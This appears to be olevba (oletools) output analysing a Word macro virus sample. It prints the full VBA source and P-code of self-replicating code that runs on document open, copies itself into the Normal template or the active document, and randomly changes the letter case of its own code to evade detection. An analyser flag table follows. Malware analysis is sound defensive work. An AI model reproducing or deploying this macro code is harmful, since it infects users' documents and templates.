olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Static
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Static - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub doCUMEnt_OpeN()
Options.VirusProtection = TRUE 
Options.SaveNormalPrompt = TRUE 
Options.ConfirmConversions = TRUE 
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
Set TaRgetmOduLE = Target.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE
TaRgetmOduLE.DeLEteliNeS 1, TaRgetmOduLE.cOunTofLINes
TaRgetmOduLE.ADdfrOmSTRinG morpH
If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function morpH()
HOST = ThisDocument.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE.Lines(1, ThisDocument.VBProject.VbcOMPoneNTS.Item(1).COdeMODULE.cOunTofLINes)
For V1 = 1 To Len(HOST)
V2 = Asc(Mid(HOST, V1, 1))
If V2 < 90 And V2 > 65 Then
If Int(Rnd * 11) > 5 Then V2 = V2 + 32
ElseIf V2 < 122 And V2 > 97 Then
If Int(Rnd * 11) > 5 Then V2 = V2 - 32
End If
morpH = morpH & Chr(V2)
Next
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Static
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11276 bytes
' Line #0:
' 	FuncDefn (Private Sub doCUMEnt_OpeN())
' Line #1:
' 	Ld TRUE  
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #2:
' 	Ld TRUE  
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #3:
' 	Ld TRUE  
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Target 
' 	EndIf 
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Target 
' 	MemLd VBProject 
' 	MemLd VbcOMPoneNTS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd COdeMODULE 
' 	Set TaRgetmOduLE 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld TaRgetmOduLE 
' 	MemLd cOunTofLINes 
' 	Ld TaRgetmOduLE 
' 	ArgsMemCall DeLEteliNeS 0x0002 
' Line #7:
' 	Ld morpH 
' 	Ld TaRgetmOduLE 
' 	ArgsMemCall ADdfrOmSTRinG 0x0001 
' Line #8:
' 	Ld Target 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Private Function morpH(id_FFFE As Variant))
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VbcOMPoneNTS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd COdeMODULE 
' 	MemLd cOunTofLINes 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VbcOMPoneNTS 
' 	ArgsMemLd Item 0x0001 
' 	MemLd COdeMODULE 
' 	ArgsMemLd Lines 0x0002 
' 	St HOST 
' Line #12:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld HOST 
' 	FnLen 
' 	For 
' Line #13:
' 	Ld HOST 
' 	Ld V1 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St V2 
' Line #14:
' 	Ld V2 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld V2 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #15:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld V2 
' 	LitDI2 0x0020 
' 	Add 
' 	St V2 
' 	EndIf 
' Line #16:
' 	Ld V2 
' 	LitDI2 0x007A 
' 	Lt 
' 	Ld V2 
' 	LitDI2 0x0061 
' 	Gt 
' 	And 
' 	ElseIfBlock 
' Line #17:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld V2 
' 	LitDI2 0x0020 
' 	Sub 
' 	St V2 
' 	EndIf 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld morpH 
' 	Ld V2 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St morpH 
' Line #20:
' 	StartForVariable 
' 	Next 
' Line #21:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |doCUMEnt_OpeN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbcOMPoneNTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|COdeMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADdfrOmSTRinG       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

